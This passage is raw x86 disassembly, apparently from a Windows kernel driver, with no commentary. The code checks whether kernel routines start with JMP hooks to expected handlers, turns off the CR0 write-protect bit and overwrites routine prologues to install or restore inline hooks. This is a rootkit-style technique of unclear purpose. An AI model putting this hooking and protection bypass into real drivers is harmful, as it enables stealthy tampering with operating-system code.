   1613e:	lea    eax,[ebp-0x50]
   16141:	push   eax
   16142:	call   ebx
   16144:	lea    eax,[ebp-0x50]
   16147:	push   eax
   16148:	call   DWORD PTR ds:0x1b178
   1614e:	mov    esi,DWORD PTR ds:0x1bfbc
   16154:	mov    edi,DWORD PTR ds:0x1b17c
   1615a:	mov    DWORD PTR [ebp-0x1c],eax
   1615d:	push   0x1ad94
   16162:	push   esi
   16163:	call   0x10ffc
   16168:	test   eax,eax
   1616a:	mov    DWORD PTR [ebp-0x10],eax
   1616d:	jne    0x16193
   1616f:	push   0x1acd0
   16174:	lea    eax,[ebp-0x50]
   16177:	push   eax
   16178:	call   ebx
   1617a:	lea    eax,[ebp-0x50]
   1617d:	push   eax
   1617e:	call   DWORD PTR ds:0x1b178
   16184:	mov    esi,DWORD PTR ds:0x1bfbc
   1618a:	mov    edi,DWORD PTR ds:0x1b17c
   16190:	mov    DWORD PTR [ebp-0x10],eax
   16193:	push   0x1ad74
   16198:	push   esi
   16199:	call   0x10ffc
   1619e:	test   eax,eax
   161a0:	mov    DWORD PTR [ebp-0x2c],eax
   161a3:	jne    0x161c9
   161a5:	push   0x1ac90
   161aa:	lea    eax,[ebp-0x50]
   161ad:	push   eax
   161ae:	call   ebx
   161b0:	lea    eax,[ebp-0x50]
   161b3:	push   eax
   161b4:	call   DWORD PTR ds:0x1b178
   161ba:	mov    esi,DWORD PTR ds:0x1bfbc
   161c0:	mov    edi,DWORD PTR ds:0x1b17c
   161c6:	mov    DWORD PTR [ebp-0x2c],eax
   161c9:	push   0x1ad54
   161ce:	push   esi
   161cf:	call   0x10ffc
   161d4:	test   eax,eax
   161d6:	mov    DWORD PTR [ebp-0x34],eax
   161d9:	jne    0x161ff
   161db:	push   0x1ac52
   161e0:	lea    eax,[ebp-0x50]
   161e3:	push   eax
   161e4:	call   ebx
   161e6:	lea    eax,[ebp-0x50]
   161e9:	push   eax
   161ea:	call   DWORD PTR ds:0x1b178
   161f0:	mov    esi,DWORD PTR ds:0x1bfbc
   161f6:	mov    edi,DWORD PTR ds:0x1b17c
   161fc:	mov    DWORD PTR [ebp-0x34],eax
   161ff:	cmp    BYTE PTR [ebp+0xc],0x0
   16203:	je     0x1631b
   16209:	push   0x1ae92
   1620e:	push   esi
   1620f:	call   0x10ffc
   16214:	test   eax,eax
   16216:	mov    DWORD PTR [ebp-0x44],eax
   16219:	jne    0x1622b
   1621b:	mov    eax,ds:0x1b188
   16220:	mov    eax,DWORD PTR [eax+0x1]
   16223:	mov    ecx,DWORD PTR [edi]
   16225:	mov    eax,DWORD PTR [ecx+eax*4]
   16228:	mov    DWORD PTR [ebp-0x44],eax
   1622b:	push   0x1ae78
   16230:	push   esi
   16231:	call   0x10ffc
   16236:	push   0x1ae5e
   1623b:	push   esi
   1623c:	mov    DWORD PTR [ebp-0x64],eax
   1623f:	call   0x10ffc
   16244:	test   eax,eax
   16246:	mov    DWORD PTR [ebp-0x54],eax
   16249:	jne    0x1625b
   1624b:	mov    eax,ds:0x1b150
   16250:	mov    eax,DWORD PTR [eax+0x1]
   16253:	mov    ecx,DWORD PTR [edi]
   16255:	mov    eax,DWORD PTR [ecx+eax*4]
   16258:	mov    DWORD PTR [ebp-0x54],eax
   1625b:	push   0x1ae44
   16260:	push   esi
   16261:	call   0x10ffc
   16266:	test   eax,eax
   16268:	mov    DWORD PTR [ebp-0x38],eax
   1626b:	jne    0x1627d
   1626d:	mov    eax,ds:0x1b13c
   16272:	mov    eax,DWORD PTR [eax+0x1]
   16275:	mov    ecx,DWORD PTR [edi]
   16277:	mov    eax,DWORD PTR [ecx+eax*4]
   1627a:	mov    DWORD PTR [ebp-0x38],eax
   1627d:	push   0x1ae34
   16282:	push   esi
   16283:	call   0x10ffc
   16288:	push   0x1ae24
   1628d:	push   esi
   1628e:	mov    DWORD PTR [ebp-0x58],eax
   16291:	call   0x10ffc
   16296:	push   0x1ae12
   1629b:	push   esi
   1629c:	mov    DWORD PTR [ebp-0x68],eax
   1629f:	call   0x10ffc
   162a4:	push   0x1adfe
   162a9:	push   esi
   162aa:	mov    DWORD PTR [ebp-0x5c],eax
   162ad:	call   0x10ffc
   162b2:	test   eax,eax
   162b4:	mov    DWORD PTR [ebp-0x3c],eax
   162b7:	jne    0x162c9
   162b9:	mov    eax,ds:0x1b1ec
   162be:	mov    eax,DWORD PTR [eax+0x1]
   162c1:	mov    ecx,DWORD PTR [edi]
   162c3:	mov    eax,DWORD PTR [ecx+eax*4]
   162c6:	mov    DWORD PTR [ebp-0x3c],eax
   162c9:	push   0x1adea
   162ce:	push   esi
   162cf:	call   0x10ffc
   162d4:	push   0x1adde
   162d9:	push   esi
   162da:	mov    DWORD PTR [ebp-0x60],eax
   162dd:	call   0x10ffc
   162e2:	test   eax,eax
   162e4:	mov    DWORD PTR [ebp-0x40],eax
   162e7:	jne    0x162f9
   162e9:	mov    eax,ds:0x1b184
   162ee:	mov    eax,DWORD PTR [eax+0x1]
   162f1:	mov    ecx,DWORD PTR [edi]
   162f3:	mov    eax,DWORD PTR [ecx+eax*4]
   162f6:	mov    DWORD PTR [ebp-0x40],eax
   162f9:	push   0x1add0
   162fe:	push   esi
   162ff:	call   0x10ffc
   16304:	test   eax,eax
   16306:	mov    DWORD PTR [ebp-0x48],eax
   16309:	jne    0x1631b
   1630b:	mov    eax,ds:0x1b1e4
   16310:	mov    eax,DWORD PTR [eax+0x1]
   16313:	mov    ecx,DWORD PTR [edi]
   16315:	mov    eax,DWORD PTR [ecx+eax*4]
   16318:	mov    DWORD PTR [ebp-0x48],eax
   1631b:	mov    eax,DWORD PTR [ebp-0x24]
   1631e:	test   eax,eax
   16320:	mov    cl,0xe9
   16322:	je     0x1633a
   16324:	cmp    BYTE PTR [eax],cl
   16326:	jne    0x16336
   16328:	mov    edx,DWORD PTR [eax+0x1]
   1632b:	lea    eax,[edx+eax*1+0x5]
   1632f:	cmp    eax,0x14c50
   16334:	je     0x1633a
   16336:	mov    BYTE PTR [ebp-0x9],0x1
   1633a:	mov    eax,DWORD PTR [ebp-0x18]
   1633d:	test   eax,eax
   1633f:	je     0x16357
   16341:	cmp    BYTE PTR [eax],cl
   16343:	jne    0x16353
   16345:	mov    edx,DWORD PTR [eax+0x1]
   16348:	lea    eax,[edx+eax*1+0x5]
   1634c:	cmp    eax,0x14948
   16351:	je     0x16357
   16353:	mov    BYTE PTR [ebp-0x3],0x1
   16357:	mov    eax,DWORD PTR [ebp-0x28]
   1635a:	test   eax,eax
   1635c:	je     0x16374
   1635e:	cmp    BYTE PTR [eax],cl
   16360:	jne    0x16370
   16362:	mov    edx,DWORD PTR [eax+0x1]
   16365:	lea    eax,[edx+eax*1+0x5]
   16369:	cmp    eax,0x150d0
   1636e:	je     0x16374
   16370:	mov    BYTE PTR [ebp-0x7],0x1
   16374:	mov    eax,DWORD PTR [ebp-0x20]
   16377:	test   eax,eax
   16379:	je     0x16391
   1637b:	cmp    BYTE PTR [eax],cl
   1637d:	jne    0x1638d
   1637f:	mov    edx,DWORD PTR [eax+0x1]
   16382:	lea    eax,[edx+eax*1+0x5]
   16386:	cmp    eax,0x14d96
   1638b:	je     0x16391
   1638d:	mov    BYTE PTR [ebp-0x5],0x1
   16391:	mov    eax,DWORD PTR [ebp-0x30]
   16394:	test   eax,eax
   16396:	je     0x163ae
   16398:	cmp    BYTE PTR [eax],cl
   1639a:	jne    0x163aa
   1639c:	mov    edx,DWORD PTR [eax+0x1]
   1639f:	lea    eax,[edx+eax*1+0x5]
   163a3:	cmp    eax,0x153fc
   163a8:	je     0x163ae
   163aa:	mov    BYTE PTR [ebp-0x1],0x1
   163ae:	mov    eax,DWORD PTR [ebp-0x14]
   163b1:	test   eax,eax
   163b3:	je     0x163cb
   163b5:	cmp    BYTE PTR [eax],cl
   163b7:	jne    0x163c7
   163b9:	mov    edx,DWORD PTR [eax+0x1]
   163bc:	lea    eax,[edx+eax*1+0x5]
   163c0:	cmp    eax,0x155ac
   163c5:	je     0x163cb
   163c7:	mov    BYTE PTR [ebp-0x2],0x1
   163cb:	mov    eax,DWORD PTR [ebp-0x1c]
   163ce:	test   eax,eax
   163d0:	je     0x163e8
   163d2:	cmp    BYTE PTR [eax],cl
   163d4:	jne    0x163e4
   163d6:	mov    edx,DWORD PTR [eax+0x1]
   163d9:	lea    eax,[edx+eax*1+0x5]
   163dd:	cmp    eax,0x158d6
   163e2:	je     0x163e8
   163e4:	mov    BYTE PTR [ebp-0x4],0x1
   163e8:	mov    eax,DWORD PTR [ebp-0x10]
   163eb:	test   eax,eax
   163ed:	je     0x16405
   163ef:	cmp    BYTE PTR [eax],cl
   163f1:	jne    0x16401
   163f3:	mov    edx,DWORD PTR [eax+0x1]
   163f6:	lea    eax,[edx+eax*1+0x5]
   163fa:	cmp    eax,0x109e4
   163ff:	je     0x16405
   16401:	mov    BYTE PTR [ebp-0x6],0x1
   16405:	mov    eax,DWORD PTR [ebp-0x2c]
   16408:	test   eax,eax
   1640a:	je     0x16422
   1640c:	cmp    BYTE PTR [eax],cl
   1640e:	jne    0x1641e
   16410:	mov    edx,DWORD PTR [eax+0x1]
   16413:	lea    eax,[edx+eax*1+0x5]
   16417:	cmp    eax,0x1590a
   1641c:	je     0x16422
   1641e:	mov    BYTE PTR [ebp-0x8],0x1
   16422:	mov    eax,DWORD PTR [ebp-0x34]
   16425:	test   eax,eax
   16427:	je     0x1643f
   16429:	cmp    BYTE PTR [eax],cl
   1642b:	jne    0x1643b
   1642d:	mov    ecx,DWORD PTR [eax+0x1]
   16430:	lea    eax,[ecx+eax*1+0x5]
   16434:	cmp    eax,0x1593c
   16439:	je     0x1643f
   1643b:	mov    BYTE PTR [ebp-0xa],0x1
   1643f:	cmp    BYTE PTR [ebp-0x9],0x0
   16443:	jne    0x16485
   16445:	cmp    BYTE PTR [ebp-0x3],0x0
   16449:	jne    0x16485
   1644b:	cmp    BYTE PTR [ebp-0x7],0x0
   1644f:	jne    0x16485
   16451:	cmp    BYTE PTR [ebp-0x5],0x0
   16455:	jne    0x16485
   16457:	cmp    BYTE PTR [ebp-0x1],0x0
   1645b:	jne    0x16485
   1645d:	cmp    BYTE PTR [ebp-0x2],0x0
   16461:	jne    0x16485
   16463:	cmp    BYTE PTR [ebp+0xc],0x0
   16467:	jne    0x16485
   16469:	cmp    BYTE PTR [ebp-0x4],0x0
   1646d:	jne    0x16485
   1646f:	cmp    BYTE PTR [ebp-0x6],0x0
   16473:	jne    0x16485
   16475:	cmp    BYTE PTR [ebp-0x8],0x0
   16479:	jne    0x16485
   1647b:	cmp    BYTE PTR [ebp-0xa],0x0
   1647f:	je     0x16998
   16485:	cmp    BYTE PTR [ebp+0x8],0x0
   16489:	jne    0x164a2
   1648b:	cli    
   1648c:	mov    eax,cr0
   1648f:	mov    DWORD PTR [ebp-0x6c],eax
   16492:	and    eax,0xfffeffff
   16497:	mov    cr0,eax
   1649a:	call   0x106e0
   1649f:	mov    BYTE PTR [ebp-0x78],al
   164a2:	cmp    BYTE PTR [ebp-0x9],0x0
   164a6:	mov    ebx,DWORD PTR ds:0x1b278
   164ac:	je     0x164f4
   164ae:	cmp    DWORD PTR [ebp-0x24],0x0
   164b2:	je     0x164f4
   164b4:	push   0x14
   164b6:	push   DWORD PTR [ebp-0x24]
   164b9:	call   0x116a0
   164be:	test   al,al
   164c0:	je     0x164f4
   164c2:	mov    esi,DWORD PTR ds:0x1bffc
   164c8:	test   esi,esi
   164ca:	je     0x164d4
   164cc:	mov    edi,DWORD PTR [ebp-0x24]
   164cf:	push   0x5
   164d1:	pop    ecx
   164d2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   164d4:	mov    eax,ds:0x1c070
   164d9:	test   eax,eax
   164db:	je     0x164e2
   164dd:	push   0x0
   164df:	push   eax
   164e0:	call   ebx
   164e2:	push   0x14c50
   164e7:	push   DWORD PTR [ebp-0x24]
   164ea:	call   0x1187c
   164ef:	mov    ds:0x1c070,eax
   164f4:	cmp    BYTE PTR [ebp-0x3],0x0
   164f8:	je     0x16540
   164fa:	cmp    DWORD PTR [ebp-0x18],0x0
   164fe:	je     0x16540
   16500:	push   0x14
   16502:	push   DWORD PTR [ebp-0x18]
   16505:	call   0x116a0
   1650a:	test   al,al
   1650c:	je     0x16540
   1650e:	mov    esi,DWORD PTR ds:0x1c000
   16514:	test   esi,esi
   16516:	je     0x16520
   16518:	mov    edi,DWORD PTR [ebp-0x18]
   1651b:	push   0x5
   1651d:	pop    ecx
   1651e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16520:	mov    eax,ds:0x1c078
   16525:	test   eax,eax
   16527:	je     0x1652e
   16529:	push   0x0
   1652b:	push   eax
   1652c:	call   ebx
   1652e:	push   0x14948
   16533:	push   DWORD PTR [ebp-0x18]
   16536:	call   0x1187c
   1653b:	mov    ds:0x1c078,eax
   16540:	cmp    BYTE PTR [ebp-0x7],0x0
   16544:	je     0x1658c
   16546:	cmp    DWORD PTR [ebp-0x28],0x0
   1654a:	je     0x1658c
   1654c:	push   0x14
   1654e:	push   DWORD PTR [ebp-0x28]
   16551:	call   0x116a0
   16556:	test   al,al
   16558:	je     0x1658c
   1655a:	mov    esi,DWORD PTR ds:0x1c004
   16560:	test   esi,esi
   16562:	je     0x1656c
   16564:	mov    edi,DWORD PTR [ebp-0x28]
   16567:	push   0x5
   16569:	pop    ecx
   1656a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1656c:	mov    eax,ds:0x1c068
   16571:	test   eax,eax
   16573:	je     0x1657a
   16575:	push   0x0
   16577:	push   eax
   16578:	call   ebx
   1657a:	push   0x150d0
   1657f:	push   DWORD PTR [ebp-0x28]
   16582:	call   0x1187c
   16587:	mov    ds:0x1c068,eax
   1658c:	cmp    BYTE PTR [ebp-0x5],0x0
   16590:	je     0x165d8
   16592:	cmp    DWORD PTR [ebp-0x20],0x0
   16596:	je     0x165d8
   16598:	push   0x14
   1659a:	push   DWORD PTR [ebp-0x20]
   1659d:	call   0x116a0
   165a2:	test   al,al
   165a4:	je     0x165d8
   165a6:	mov    esi,DWORD PTR ds:0x1c008
   165ac:	test   esi,esi
   165ae:	je     0x165b8
   165b0:	mov    edi,DWORD PTR [ebp-0x20]
   165b3:	push   0x5
   165b5:	pop    ecx
   165b6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   165b8:	mov    eax,ds:0x1c074
   165bd:	test   eax,eax
   165bf:	je     0x165c6
   165c1:	push   0x0
   165c3:	push   eax
   165c4:	call   ebx
   165c6:	push   0x14d96
   165cb:	push   DWORD PTR [ebp-0x20]
   165ce:	call   0x1187c
   165d3:	mov    ds:0x1c074,eax
   165d8:	cmp    BYTE PTR [ebp-0x1],0x0
   165dc:	je     0x16624
   165de:	cmp    DWORD PTR [ebp-0x30],0x0
   165e2:	je     0x16624
   165e4:	push   0x14
   165e6:	push   DWORD PTR [ebp-0x30]
   165e9:	call   0x116a0
   165ee:	test   al,al
   165f0:	je     0x16624
   165f2:	mov    esi,DWORD PTR ds:0x1c00c
   165f8:	test   esi,esi
   165fa:	je     0x16604
   165fc:	mov    edi,DWORD PTR [ebp-0x30]
   165ff:	push   0x5
   16601:	pop    ecx
   16602:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16604:	mov    eax,ds:0x1c06c
   16609:	test   eax,eax
   1660b:	je     0x16612
   1660d:	push   0x0
   1660f:	push   eax
   16610:	call   ebx
   16612:	push   0x153fc
   16617:	push   DWORD PTR [ebp-0x30]
   1661a:	call   0x1187c
   1661f:	mov    ds:0x1c06c,eax
   16624:	cmp    BYTE PTR [ebp-0x2],0x0
   16628:	je     0x16670
   1662a:	cmp    DWORD PTR [ebp-0x14],0x0
   1662e:	je     0x16670
   16630:	push   0x14
   16632:	push   DWORD PTR [ebp-0x14]
   16635:	call   0x116a0
   1663a:	test   al,al
   1663c:	je     0x16670
   1663e:	mov    esi,DWORD PTR ds:0x1c010
   16644:	test   esi,esi
   16646:	je     0x16650
   16648:	mov    edi,DWORD PTR [ebp-0x14]
   1664b:	push   0x5
   1664d:	pop    ecx
   1664e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16650:	mov    eax,ds:0x1c07c
   16655:	test   eax,eax
   16657:	je     0x1665e
   16659:	push   0x0
   1665b:	push   eax
   1665c:	call   ebx
   1665e:	push   0x155ac
   16663:	push   DWORD PTR [ebp-0x14]
   16666:	call   0x1187c
   1666b:	mov    ds:0x1c07c,eax
   16670:	cmp    BYTE PTR [ebp-0x4],0x0
   16674:	je     0x166bc
   16676:	cmp    DWORD PTR [ebp-0x1c],0x0
   1667a:	je     0x166bc
   1667c:	push   0x14
   1667e:	push   DWORD PTR [ebp-0x1c]
   16681:	call   0x116a0
   16686:	test   al,al
   16688:	je     0x166bc
   1668a:	mov    esi,DWORD PTR ds:0x1c040
   16690:	test   esi,esi
   16692:	je     0x1669c
   16694:	mov    edi,DWORD PTR [ebp-0x1c]
   16697:	push   0x5
   16699:	pop    ecx
   1669a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1669c:	mov    eax,ds:0x1c080
   166a1:	test   eax,eax
   166a3:	je     0x166aa
   166a5:	push   0x0
   166a7:	push   eax
   166a8:	call   ebx
   166aa:	push   0x158d6
   166af:	push   DWORD PTR [ebp-0x1c]
   166b2:	call   0x1187c
   166b7:	mov    ds:0x1c080,eax
   166bc:	cmp    BYTE PTR [ebp-0x6],0x0
   166c0:	je     0x16708
   166c2:	cmp    DWORD PTR [ebp-0x10],0x0
   166c6:	je     0x16708
   166c8:	push   0x14
   166ca:	push   DWORD PTR [ebp-0x10]
   166cd:	call   0x116a0
   166d2:	test   al,al
   166d4:	je     0x16708
   166d6:	mov    esi,DWORD PTR ds:0x1c044
   166dc:	test   esi,esi
   166de:	je     0x166e8
   166e0:	mov    edi,DWORD PTR [ebp-0x10]
   166e3:	push   0x5
   166e5:	pop    ecx
   166e6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   166e8:	mov    eax,ds:0x1c084
   166ed:	test   eax,eax
   166ef:	je     0x166f6
   166f1:	push   0x0
   166f3:	push   eax
   166f4:	call   ebx
   166f6:	push   0x109e4
   166fb:	push   DWORD PTR [ebp-0x10]
   166fe:	call   0x1187c
   16703:	mov    ds:0x1c084,eax
   16708:	cmp    BYTE PTR [ebp-0x8],0x0
   1670c:	je     0x16754
   1670e:	cmp    DWORD PTR [ebp-0x2c],0x0
   16712:	je     0x16754
   16714:	push   0x14
   16716:	push   DWORD PTR [ebp-0x2c]
   16719:	call   0x116a0
   1671e:	test   al,al
   16720:	je     0x16754
   16722:	mov    esi,DWORD PTR ds:0x1c048
   16728:	test   esi,esi
   1672a:	je     0x16734
   1672c:	mov    edi,DWORD PTR [ebp-0x2c]
   1672f:	push   0x5
   16731:	pop    ecx
   16732:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16734:	mov    eax,ds:0x1c088
   16739:	test   eax,eax
   1673b:	je     0x16742
   1673d:	push   0x0
   1673f:	push   eax
   16740:	call   ebx
   16742:	push   0x1590a
   16747:	push   DWORD PTR [ebp-0x2c]
   1674a:	call   0x1187c
   1674f:	mov    ds:0x1c088,eax
   16754:	cmp    BYTE PTR [ebp-0xa],0x0
   16758:	je     0x167a0
   1675a:	cmp    DWORD PTR [ebp-0x34],0x0
   1675e:	je     0x167a0
   16760:	push   0x14
   16762:	push   DWORD PTR [ebp-0x34]
   16765:	call   0x116a0
   1676a:	test   al,al
   1676c:	je     0x167a0
   1676e:	mov    esi,DWORD PTR ds:0x1c04c
   16774:	test   esi,esi
   16776:	je     0x16780
   16778:	mov    edi,DWORD PTR [ebp-0x34]
   1677b:	push   0x5
   1677d:	pop    ecx
   1677e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16780:	mov    eax,ds:0x1c08c
   16785:	test   eax,eax
   16787:	je     0x1678e
   16789:	push   0x0
   1678b:	push   eax
   1678c:	call   ebx
   1678e:	push   0x1593c
   16793:	push   DWORD PTR [ebp-0x34]
   16796:	call   0x1187c
   1679b:	mov    ds:0x1c08c,eax
   167a0:	cmp    BYTE PTR [ebp+0xc],0x0
   167a4:	je     0x16983
   167aa:	cmp    DWORD PTR [ebp-0x44],0x0
   167ae:	je     0x167d5
   167b0:	cmp    DWORD PTR ds:0x1c014,0x0
   167b7:	je     0x167d5
   167b9:	push   0x14
   167bb:	push   DWORD PTR [ebp-0x44]
   167be:	call   0x116a0
   167c3:	test   al,al
   167c5:	je     0x167d5
   167c7:	mov    esi,DWORD PTR ds:0x1c014
   167cd:	mov    edi,DWORD PTR [ebp-0x44]
   167d0:	push   0x5
   167d2:	pop    ecx
   167d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   167d5:	cmp    DWORD PTR [ebp-0x64],0x0
   167d9:	je     0x16800
   167db:	cmp    DWORD PTR ds:0x1c018,0x0
   167e2:	je     0x16800
   167e4:	push   0x14
   167e6:	push   DWORD PTR [ebp-0x64]
   167e9:	call   0x116a0
   167ee:	test   al,al
   167f0:	je     0x16800
   167f2:	mov    esi,DWORD PTR ds:0x1c018
   167f8:	mov    edi,DWORD PTR [ebp-0x64]
   167fb:	push   0x5
   167fd:	pop    ecx
   167fe:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16800:	cmp    DWORD PTR [ebp-0x54],0x0
   16804:	je     0x1682b
   16806:	cmp    DWORD PTR ds:0x1c01c,0x0
   1680d:	je     0x1682b
   1680f:	push   0x14
   16811:	push   DWORD PTR [ebp-0x54]
   16814:	call   0x116a0
   16819:	test   al,al
   1681b:	je     0x1682b
   1681d:	mov    esi,DWORD PTR ds:0x1c01c
   16823:	mov    edi,DWORD PTR [ebp-0x54]
   16826:	push   0x5
   16828:	pop    ecx
   16829:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1682b:	cmp    DWORD PTR [ebp-0x38],0x0
   1682f:	je     0x16856
   16831:	cmp    DWORD PTR ds:0x1c020,0x0
   16838:	je     0x16856
   1683a:	push   0x14
   1683c:	push   DWORD PTR [ebp-0x38]
   1683f:	call   0x116a0
   16844:	test   al,al
   16846:	je     0x16856
   16848:	mov    esi,DWORD PTR ds:0x1c020
   1684e:	mov    edi,DWORD PTR [ebp-0x38]
   16851:	push   0x5
   16853:	pop    ecx
   16854:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16856:	cmp    DWORD PTR [ebp-0x58],0x0
   1685a:	je     0x16881
   1685c:	cmp    DWORD PTR ds:0x1c024,0x0
   16863:	je     0x16881
   16865:	push   0x14
   16867:	push   DWORD PTR [ebp-0x58]
   1686a:	call   0x116a0
   1686f:	test   al,al
   16871:	je     0x16881
   16873:	mov    esi,DWORD PTR ds:0x1c024
   16879:	mov    edi,DWORD PTR [ebp-0x58]
   1687c:	push   0x5
   1687e:	pop    ecx
   1687f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16881:	cmp    DWORD PTR [ebp-0x68],0x0
   16885:	je     0x168ac
   16887:	cmp    DWORD PTR ds:0x1c028,0x0
   1688e:	je     0x168ac
   16890:	push   0x14
   16892:	push   DWORD PTR [ebp-0x68]
   16895:	call   0x116a0
   1689a:	test   al,al
   1689c:	je     0x168ac
   1689e:	mov    esi,DWORD PTR ds:0x1c028
   168a4:	mov    edi,DWORD PTR [ebp-0x68]
   168a7:	push   0x5
   168a9:	pop    ecx
   168aa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   168ac:	cmp    DWORD PTR [ebp-0x5c],0x0
   168b0:	je     0x168d7
   168b2:	cmp    DWORD PTR ds:0x1c02c,0x0
   168b9:	je     0x168d7
   168bb:	push   0x14
   168bd:	push   DWORD PTR [ebp-0x5c]
   168c0:	call   0x116a0
   168c5:	test   al,al
   168c7:	je     0x168d7
   168c9:	mov    esi,DWORD PTR ds:0x1c02c
   168cf:	mov    edi,DWORD PTR [ebp-0x5c]
   168d2:	push   0x5
   168d4:	pop    ecx
   168d5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   168d7:	cmp    DWORD PTR [ebp-0x3c],0x0
   168db:	je     0x16902
   168dd:	cmp    DWORD PTR ds:0x1c030,0x0
   168e4:	je     0x16902
   168e6:	push   0x14
   168e8:	push   DWORD PTR [ebp-0x3c]
   168eb:	call   0x116a0
   168f0:	test   al,al
   168f2:	je     0x16902
   168f4:	mov    esi,DWORD PTR ds:0x1c030
   168fa:	mov    edi,DWORD PTR [ebp-0x3c]
   168fd:	push   0x5
   168ff:	pop    ecx
   16900:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16902:	cmp    DWORD PTR [ebp-0x60],0x0
   16906:	je     0x1692d
   16908:	cmp    DWORD PTR ds:0x1c034,0x0
   1690f:	je     0x1692d
   16911:	push   0x14
   16913:	push   DWORD PTR [ebp-0x60]
   16916:	call   0x116a0
   1691b:	test   al,al
   1691d:	je     0x1692d
   1691f:	mov    esi,DWORD PTR ds:0x1c034
   16925:	mov    edi,DWORD PTR [ebp-0x60]
   16928:	push   0x5
   1692a:	pop    ecx
   1692b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1692d:	cmp    DWORD PTR [ebp-0x40],0x0
   16931:	je     0x16958
   16933:	cmp    DWORD PTR ds:0x1c038,0x0
   1693a:	je     0x16958
   1693c:	push   0x14
   1693e:	push   DWORD PTR [ebp-0x40]
   16941:	call   0x116a0
   16946:	test   al,al
   16948:	je     0x16958
   1694a:	mov    esi,DWORD PTR ds:0x1c038
   16950:	mov    edi,DWORD PTR [ebp-0x40]
   16953:	push   0x5
   16955:	pop    ecx
   16956:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16958:	cmp    DWORD PTR [ebp-0x48],0x0
   1695c:	je     0x16983
   1695e:	cmp    DWORD PTR ds:0x1c03c,0x0
   16965:	je     0x16983
   16967:	push   0x14
   16969:	push   DWORD PTR [ebp-0x48]
   1696c:	call   0x116a0
   16971:	test   al,al
   16973:	je     0x16983
   16975:	mov    esi,DWORD PTR ds:0x1c03c
   1697b:	mov    edi,DWORD PTR [ebp-0x48]
   1697e:	push   0x5
   16980:	pop    ecx
   16981:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   16983:	cmp    BYTE PTR [ebp+0x8],0x0
   16987:	jne    0x16998
   16989:	push   DWORD PTR [ebp-0x78]
   1698c:	call   0x10714
   16991:	mov    eax,DWORD PTR [ebp-0x6c]
   16994:	mov    cr0,eax
   16997:	sti    
   16998:	push   0x0
   1699a:	push   0x1c340
   1699f:	call   DWORD PTR ds:0x1b1b0
   169a5:	pop    esi
   169a6:	pop    ebx
   169a7:	pop    edi
   169a8:	leave  
   169a9:	ret    0x8
   169ac:	int3   
   169ad:	int3   
   169ae:	int3   
   169af:	int3   
   169b0:	int3   
   169b1:	int3   
   169b2:	push   0x6ac
   169b7:	push   0x1b5d0
   169bc:	call   0x1a38c
   169c1:	mov    esi,DWORD PTR [ebp+0x8]
   169c4:	xor    ebx,ebx
   169c6:	mov    DWORD PTR [ebp-0x634],ebx
   169cc:	mov    DWORD PTR [ebp-0x690],ebx
   169d2:	mov    DWORD PTR [ebp-0x640],ebx
   169d8:	mov    DWORD PTR [ebp-0x638],ebx
   169de:	mov    DWORD PTR [ebp-0x224],ebx
   169e4:	push   0x204
   169e9:	push   ebx
   169ea:	lea    eax,[ebp-0x220]
   169f0:	push   eax
   169f1:	call   0x1a1b0
   169f6:	mov    WORD PTR [ebp-0x624],bx
   169fd:	push   0x3fe
   16a02:	push   ebx
   16a03:	lea    eax,[ebp-0x622]
   16a09:	push   eax
   16a0a:	call   0x1a1b0
   16a0f:	add    esp,0x18
   16a12:	cmp    esi,ebx
   16a14:	jne    0x16a1d
   16a16:	xor    eax,eax
   16a18:	jmp    0x17430
   16a1d:	push   esi
   16a1e:	lea    eax,[ebp-0x68c]
   16a24:	push   eax
   16a25:	call   DWORD PTR ds:0x1b164
   16a2b:	mov    DWORD PTR [ebp-0x660],0x18
   16a35:	mov    DWORD PTR [ebp-0x65c],ebx
   16a3b:	mov    DWORD PTR [ebp-0x654],0x40
   16a45:	lea    eax,[ebp-0x68c]
   16a4b:	mov    DWORD PTR [ebp-0x658],eax
   16a51:	mov    DWORD PTR [ebp-0x650],ebx
   16a57:	mov    DWORD PTR [ebp-0x64c],ebx
   16a5d:	lea    eax,[ebp-0x660]
   16a63:	push   eax
   16a64:	call   DWORD PTR ds:0x1b1e4
   16a6a:	push   ebx
   16a6b:	push   ebx
   16a6c:	push   ebx
   16a6d:	push   ebx
   16a6e:	push   0x1c100
   16a73:	call   DWORD PTR ds:0x1b110
   16a79:	test   eax,eax
   16a7b:	jne    0x1742a
   16a81:	push   0xb
   16a83:	call   0x10b52
   16a88:	mov    DWORD PTR [ebp-0x63c],eax
   16a8e:	cmp    eax,ebx
   16a90:	je     0x16dfe
   16a96:	mov    edi,DWORD PTR ds:0x1bfd4
   16a9c:	jmp    0x16de9
   16aa1:	cmp    DWORD PTR [edi],0x1
   16aa4:	jne    0x16de3
   16aaa:	mov    BYTE PTR [ebp-0x625],bl
   16ab0:	mov    DWORD PTR [ebp-0x630],ebx
   16ab6:	mov    esi,DWORD PTR [ebp-0x63c]
   16abc:	cmp    DWORD PTR [esi],ebx
   16abe:	jbe    0x16bc0
   16ac4:	add    esi,0x10
   16ac7:	mov    DWORD PTR [ebp-0x62c],esi
   16acd:	mov    eax,DWORD PTR [esi-0x4]
   16ad0:	mov    ecx,DWORD PTR [esi]
   16ad2:	cmp    eax,DWORD PTR [edi+0x10]
   16ad5:	jne    0x16b9a
